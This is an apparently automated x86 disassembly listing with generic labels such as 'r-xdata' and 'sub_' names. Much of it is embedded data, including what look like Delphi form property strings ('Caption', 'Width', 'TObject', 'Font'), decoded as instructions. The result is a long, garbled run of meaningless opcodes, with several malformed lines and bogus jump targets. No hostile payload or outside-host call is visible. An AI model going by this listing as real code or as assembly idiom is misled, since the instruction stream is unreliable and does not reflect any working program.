jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc esp
add [ esi + esi * 2 ] dl
dec eax
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ eax + 0x7a ] bh
dec eax
add [ eax ] bl
push esi
inc esp
add [ eax + r-xdata ] dl
inc eax
push edi
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax + 0x48852490 ] dl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
push esp
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ esi + 0x44 ] dl
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc esp
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x40 ] si
push edi
inc esp
add [ esi + esi * 2 ] dl
dec eax
add [ eax + 0x8004884 ] bl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
sbb [ esi + 0x44 ] dl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ edx + ecx * 4 + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esi
inc esp
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ eax + 0x57 ] al
inc esp
add [ edx + ecx * 4 + 0x48 ] dl
add [ eax - 0x6c ] bh
dec eax
add [ eax ] bl
push esi
inc esp
add [ esp + eax * 4 + 0x48 ] cl
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + 0x4886ac90 ] dl
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ esi + edx * 2 + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esi
inc esp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push esi
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x78 ] bh
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ eax + 0x48862490 ] dl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
inc eax
push edi
inc esp
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ esi + edx * 2 + 0x44 ] ch
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac87f8
add [ eax ] al
shr [ edx + eax * 2 ] 0x0
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
jo r-xdata
add al al
sub al 0x42
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esi
inc esp
add [ eax - 0x782f6f70 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x78 ] ah
dec eax
add [ eax - 0x76 ] bl
dec eax
add [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ esp + edx + 0x42 ] ch
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ esi + edx * 2 + 0x44 ] ch
add [ esi + edx * 2 + 0x44 ] ch
add [ eax ] bl
push esi
inc esp
add [ eax - 0x7a6b6f70 ] dl
dec eax
add [ eax ] cl
nop
nop
nop
rol [ edi + 0x48 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
mov [ eax ] cl
pop eax
mov cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jpe r-xdata
jbe r-xdata
add [ edx - 0x76 ] cl
dec eax
add [ ecx + eax + 0x2cc00000 ] ah
inc edx
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ eax + 0x57 ] al
inc esp
add [ esp + edx + 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esi
inc esp
add [ eax ] ah
xchg [ eax ] ecx
or [ edx ] dl
push esp
inc ebx
outsd
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
outsb
dec eax
add [ eax ] cl
adc dl [ ebx + eax * 2 + 0x6f ]
dec eax
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add al al
test [ eax ] 0x48
add [ eax + eax + 0x64 ] 0xc004481
into
push eax
outsd
jae r-xdata
dec eax
add [ eax - 0x37ffb6f8 ] dl
stc
dec eax
add al al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add al bh
ror [ eax ] 0x1
push esp
ror [ eax ] 0x1
js r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ esi + ecx * 8 ] cl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add ah bh
int3
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_4887b6
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al al
test [ eax ] 0x48
add [ eax + eax + 0x64 ] 0xc004481
into
dec eax
add [ eax - 0x37ffb6f8 ] dl
stc
dec eax
add al al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add al bh
ror [ eax ] 0x1
push esp
ror [ eax ] 0x1
js r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ esi + ecx * 8 ] cl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add ah bh
int3
sub_488c6f
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xeec0042 0x49
sub_488cae
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_488ce4
adc [ eax * 2 + 0x48cb5400 ] 0x0
mov [ eax * 2 + 0x48cb7800 ] dl
add [ eax + 0x18004514 ] dl
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_48928a
mov ecx 0xd1ffb8ff
push [ edi - 0x30000601 ]
push [ esi - 0x4b004a01 ]
push [ ebx - 0x4d000201 ]
push [ ecx - 0x6b003701 ]
inc esp
dec ecx
add ah dh
inc esi
dec ecx
add [ edi + eax * 2 ] dl
dec ecx
add [ eax ] bh
inc edi
dec ecx
add [ eax - 0x57ffb6b9 ] cl
inc edi
dec ecx
add al cl
inc edi
dec ecx
add ah ch
inc edi
dec ecx
add [ eax ] dl
dec eax
dec ecx
add [ eax + ecx * 2 ] dh
dec ecx
add [ eax + 0x28004948 ] cl
dec ecx
dec ecx
add al ah
dec ecx
dec ecx
add [ edx + ecx * 2 ] dh
dec ecx
add [ eax - 0x33ffb6b6 ] dh
dec edx
dec ecx
add [ ebp + edx * 2 + 0x55d80049 ] ch
dec ecx
add [ esi + edx * 2 + 0x56cc0049 ] ch
dec ecx
add [ edi + edx * 2 + 0x49 ] dh
add [ eax + ebx * 2 + 0x49 ] al
add al dh
pop eax
dec ecx
add [ eax ] dl
pop ecx
dec ecx
add [ ecx + ebx * 2 + 0x49 ] al
add [ ecx + ebx * 2 + 0x49 ] ah
add [ eax + ecx * 2 + 0x49 ] dl
add [ eax ] cl
js r-xdata
push 0xb000495c
pop esp
dec ecx
add al bl
pop esp
dec ecx
add [ ebp + ebx * 2 + 0x49 ] dl
add [ ebx * 2 + 0x5d940049 ] dl
dec ecx
add ah dl
pop ebp
dec ecx
add [ esi + ebx * 2 ] dl
dec ecx
add [ eax + 0x5c ] al
dec ecx
add [ edx + ebx * 2 + 0x5b200049 ] ch
dec ecx
add [ ebx + ebx * 2 + 0x5bb00049 ] ah
dec ecx
add [ eax + 0x5e ] al
dec ecx
add al ch
pop esi
dec ecx
add [ eax + 0x5e ] cl
dec ecx
add [ eax + 0x5e ] dl
dec ecx
add [ eax + 0x5e ] bl
dec ecx
add [ eax + 0x5e ] ah
dec ecx
add [ edi + ebx * 2 + 0x60800049 ] bl
dec ecx
add ah dl
pushad
dec ecx
add [ ecx ] ah
dec ecx
add [ eax - 0x23ffb69f ] al
dec ecx
add [ eax - 0x3bffb69a ] ah
pop edx
dec ecx
add ah bh
pop edx
dec ecx
add [ eax + 0x7d ] cl
dec ecx
add [ esp + edi * 2 + 0x49 ] dh
add [ eax ] cl
pop esp
dec ecx
add al al
pop esi
dec ecx
add ah dl
pop esi
dec ecx
add [ ebx + edx * 2 ] ch
dec ecx
add [ esp + edx * 2 ] bl
dec ecx
add [ esp + edx * 2 + 0x49 ] al
add [ esi * 2 + 0x69e80049 ] dl
dec ecx
add [ ebx + 0x49 ] bl
add [ ecx + edx * 2 + 0x51b00049 ] ch
dec ecx
add [ eax + 0x4f ] al
dec ecx
add [ eax + edx * 2 ] bl
dec ecx
add al ch
dec edi
dec ecx
add [ eax + 0x4f ] bl
add al dl
pop ecx
dec ecx
add ah ch
pop ecx
dec ecx
add [ eax + edi * 2 + 0x5a680049 ] bl
dec ecx
add [ edx + ebx * 2 + 0x47540049 ] cl
dec ecx
add [ eax + 0x47 ] ch
dec ecx
add [ eax + 0x47 ] bh
dec ecx
add ah dl
dec ebx
dec ecx
add al dh
dec ebx
dec ecx
add [ esp + ecx * 2 ] cl
dec ecx
add [ eax ] ah
dec esp
dec ecx
add [ ebx + edi * 2 + 0x5bd00049 ] al
dec ecx
add ah ah
pop ebx
dec ecx
add al bh
pop ebx
dec ecx
add [ eax ] al
pop esp
dec ecx
add [ eax ] dl
pop esp
dec ecx
add [ eax + 0x5c ] ch
dec ecx
add [ eax - 0x27ffb6a4 ] dh
nop
nop
jl r-xdata
add ah al
push esp
dec ecx
add [ esi + edx * 2 ] al
dec ecx
add ah ch
push esi
dec ecx
add [ eax ] dl
pop edx
dec ecx
add [ eax + 0x40004950 ] bh
outsd
dec ecx
add ah bl
dec ecx
add [ edi + 0x4f980049 ] ah
dec ecx
add [ ecx ] bh
dec ecx
add [ eax ] ah
push 0x6ef80049
dec ecx
add [ eax ] bl
insd
dec ecx
add [ eax + 0x1c00497d ] ah
push edx
dec ecx
add [ ebx ] cl
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
dec ecx
add [ eax + 0x4f ] bh
dec ecx
add [ eax + 0x20 ] ch
dec ecx
add [ edi + ecx * 2 + 0x49 ] dl
add [ eax + edx * 2 + 0x49 ] bl
add [ ebp + esi * 2 + 0x49 ] dl
add [ ecx + edx * 2 ] dl
dec ecx
add ah dl
jge r-xdata
pop eax
dec edi
dec eax
add [ edi ] al
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
or [ ecx ] cl
enter 0x48f9 0x0
ror [ ebp + 0x42 ] 0x0
pop eax
or [ ecx ] cl
clc
outsd
insb
int3
ror [ eax ] 0x1
push esp
ror [ eax ] 0x1
js r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ edi + edi * 2 + 0x8900049 ] ch
dec ecx
add al cl
stc
dec eax
add al al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add al bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax + 0x7f ] dl
dec ecx
add [ eax + 0x7c0048f0 ] al
sub_48952e
dec eax
add [ ecx + esi * 8 + 0x48 ] cl
add [ edi + ecx * 8 - 0x2703ffb8 ] bl
dec eax
add [ eax - 0x28 ] ah
dec eax
add [ eax ] cl
jecxz r-xdata
add [ ecx ] al
add [ edi ] cl
add ah ch
jg r-xdata
add ah ah
into
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
sbb al 0xd1
dec eax
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0x6448de3f
fimul [ eax ]
cwde
loope r-xdata
add [ eax ] al
add [ eax ] al
and al 0x97
add [ edi ] cl
push esp
inc edi
jb r-xdata
push 0x6f436369
outsb
je r-xdata
add [ eax ] al
dec eax
add ah bl
dec eax
add al ah
into
dec eax
add al bl
or cl [ ecx ]
int3
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
dec eax
jo r-xdata
jne r-xdata
outsd
insb
clc
xchg esp eax
dec eax
add [ edx + ecx * 4 + 0x48 ] dl
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac9650
imul esp [ ebx + 0x43 ] 0x72746e6f
outsd
insb
test al 0x95
dec eax
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd448df6f
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
outsd
insb
jae r-xdata
fdivr [ ebx ]
dec ecx
add [ eax - 0x7f ] cl
inc esp
imul esp [ ebx + 0x43 ] 0x72746e6f
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebx + ecx * 4 ] al
dec ecx
add [ ebp + esi * 2 + 0x49 ] bl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x7fffb676 ] ch
outsd
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
xchg edi eax
dec eax
add [ eax ] dl
xchg edi eax
dec eax
add [ edx + eax ] ch
add [ eax + edx * 4 + 0x48 ] dh
add [ eax + 0x48962890 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 ] ah
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebx + ecx * 4 + 0x49 ] dl
add [ eax ] cl
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add al al
dec ecx
add al al
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
pop esp
jne r-xdata
outsd
insb
sub [ esi - 0x6b87ffb8 ] dl
dec eax
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
str [ eax ]
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
mov [ ecx ] cs
add [ eax ] eax
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd448e0eb
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec ecx
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
outsd
insb
jae r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebx + ecx * 4 ] al
dec ecx
add [ ebp + esi * 2 + 0x49 ] bl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax + eax * 4 + 0x6f800049 ] ah
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
add [ eax - 0x685b6f70 ] dl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
cwde
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 4 - 0x6749ffb8 ] bl
dec eax
add [ edx + eax ] dh
add al dl
xchg ebp eax
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac97cc
dec ecx
add [ ebx + eax * 4 + 0x49 ] dh
add ah al
xchg [ ecx ] ecx
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ebx + ecx * 4 + 0x49 ] dl
add [ eax ] cl
jge r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ eax - 0x1fffb6ca ] ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ ecx + eax * 4 ] cl
dec ecx
add al al
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
in al dx
out dx eax
inc esp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac996c
imul ebp [ esi + 0x64 ] 0x9090776f
dec eax
imul ebp [ esi + 0x74 ] 0x646e6957
outsd
ja r-xdata
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add ah bl
or [ ecx ] sub_49875c
or al 0x84
dec ecx
add [ eax ] al
or [ ecx ] 0xffffffe8
xchg [ ecx ] ecx
aam 0x86
dec ecx
add ah bh
xchg [ ecx ] cl
add al 0x0
test [ eax ] al
test [ eax ] eax
adc dh [ eax - 0x7e8ffce9 ]
dec ecx
add [ eax - 0x7f ] bh
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah dl
int1
inc esp
add [ eax ] bl
std
inc esp
add [ eax + eax + 0x45 ] dh
add [ eax - 0x7ffbb04 ] cl
out 0x42 al
add [ eax + 0x80042e5 ] dh
imul ebp [ esi + 0x64 ] 0x97a4776f
dec eax
add [ eax ] ah
xchg edi eax
dec eax
add [ edi ] cl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
dec ecx
add [ esp + ebp + 0x49 ] dl
add [ eax + 0x2e ] dl
enter 0x4898 0x0
pop es
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
nop
dec eax
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84ac9a44
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x48999c90
add [ edi ] al
push cs
push esp
inc esp
jb r-xdata
out 0x42 eax
add [ eax ] al
call 0xffffffffea5c99a4
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ecx + esi * 8 ] dh
inc esp
add [ eax - 0x8 ] ah
inc esp
add [ eax + ecx * 4 ] ch
dec ecx
add [ eax + 0x5e40045 ] dh
inc ebp
add [ eax + ecx * 4 + 0x540e0049 ] dh
inc esp
jb r-xdata
add [ eax ] cl
outsd
insb
jae r-xdata
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah dl
int1
inc esp
add [ eax ] bl
std
inc esp
add [ eax + eax + 0x45 ] dh
add [ eax - 0x7ffbb04 ] cl
out 0x42 al
add [ eax + 0x80042e5 ] dh
out 0x42 eax
add [ eax ] al
call 0xffffffffea5c9a7c
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ecx + esi * 8 ] dh
inc esp
add [ eax - 0x8 ] ah
inc esp
add [ eax + ecx * 4 ] ch
dec ecx
add [ eax + 0x5e40045 ] dh
inc ebp
add [ eax + ecx * 4 + 0x540a0049 ] dh
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x489a7090
add [ edi ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
cwde
cdq
dec eax
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
movsb [ edi ] [ esi ]
add [ eax + 0x48994490 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0x48 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x8c0048 ] bl
add [ eax ] al
push 0xccff0000
test [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or al [ ebx + 0x6f ]
insb
outsd
jb r-xdata
outsd
insb
jae r-xdata
add [ esi ] al
dec eax
imul esp [ gs : edi + 0x68 ] 0x44ef3474
add [ ebx ] al
add bh bh
inc ebx
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ ecx + 0x6d ] ecx
popad
push esp
jns r-xdata
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1fffffff ] al
add eax [ eax ]
or al [ edx + 0x6c ]
outsb
inc ebx
outsd
insb
outsd
jb r-xdata
add ah cl
mov ah 0x46
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
[ edi ]
add [ eax ] al
[ eax ]
hlt
sbb [ gs : esi + 0x44 ] dl
add [ ecx ] al
add bh bh
inc ecx
